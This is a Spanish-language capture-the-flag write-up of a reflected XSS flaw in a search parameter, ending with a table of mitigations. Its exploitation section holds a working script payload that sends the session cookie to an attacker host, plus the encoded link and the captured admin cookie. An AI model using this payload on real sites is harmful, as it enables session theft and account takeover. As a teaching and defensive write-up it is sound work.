# XSS reflejado en el buscador

**Reto:** `web/lookup` — 200 pts
**Dificultad:** media

## Reconocimiento

La aplicación expone un buscador que refleja el término consultado sin sanitizar
en la respuesta. El parámetro sospechoso es `q`:

```
GET /search?q=hola HTTP/1.1
Host: target.ctf
```

La respuesta lo incrusta directamente en el HTML:

```html
<p>Resultados para: hola</p>
```

## Detección

Probamos a inyectar comillas y una etiqueta para confirmar que el contexto es
HTML y no hay codificación de salida:

```
/search?q=<b>xss</b>
```

El texto aparece en **negrita**, así que el marcado se interpreta. No hay WAF
aparente ni cabecera `Content-Security-Policy`.

## Explotación

Construimos un payload que exfiltra la cookie de sesión a nuestro servidor:

```javascript
<script>
  new Image().src = "https://attacker.tld/c?" + encodeURIComponent(document.cookie);
</script>
```

URL final (codificada) enviada a la víctima:

```
https://target.ctf/search?q=%3Cscript%3Enew%20Image().src%3D...%3C%2Fscript%3E
```

Al abrir el enlace, el bot administrador ejecuta el script y recibimos su cookie:

```
GET /c?flag_session=eyJ1c2VyIjoiYWRtaW4if...
```

## Flag

```
CTF{r3fl3ct3d_x55_1s_st1ll_a_th1ng}
```

## Mitigación

| Medida | Efecto |
| --- | --- |
| Codificar salida (`htmlspecialchars`) | Neutraliza la inyección en contexto HTML |
| Cabecera CSP restrictiva | Bloquea scripts inline aunque falle la codificación |
| Cookie `HttpOnly` | Impide leer la sesión desde JavaScript |

> Lección: cualquier dato reflejado del usuario debe codificarse según el
> contexto exacto en el que se inserta.
